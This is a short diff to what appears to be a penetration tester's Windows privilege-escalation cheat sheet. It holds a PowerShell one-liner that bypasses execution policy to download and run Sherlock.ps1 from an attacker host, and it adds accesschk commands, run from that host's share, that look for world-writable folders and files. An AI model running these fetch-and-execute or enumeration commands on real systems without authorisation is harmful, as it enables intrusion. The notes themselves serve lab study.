@@ -41,6 +41,12 @@ Run Sherlock.ps1
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/Sherlock.ps1');Find-AllVulns"
 
 accesschk.exe /accepteula -wvu
+Folder Perms 
+\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\
+\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\
+File Perms 
+\\192.168.119.155\test\accesschk.exe /accepteula -uwqs  "Authenticated Users" C:\*.*
+\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\*.*
 
 
 ````
